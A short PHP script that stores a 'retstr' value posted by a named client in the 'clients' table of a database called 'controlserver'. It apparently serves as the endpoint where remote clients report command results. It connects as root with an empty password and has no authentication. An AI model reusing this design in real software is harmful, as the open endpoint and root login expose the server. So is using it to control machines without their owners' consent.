<?php

if(isset($_POST['client']) && !empty($_POST['client'])){
	$client = $_POST['client'];
	$retstr = $_POST['retstr'];
	
	$db = new mysqli('localhost', 'root','', 'controlserver');
	if(mysqli_connect_errno()) exit;
	
		
	
	$query = "UPDATE clients SET retstr=? WHERE name=?";
	$stmt = $db->prepare($query);
	$stmt->bind_param('ss', $retstr, $client); 
	$stmt->execute();
	
	$db->close();	
}
?>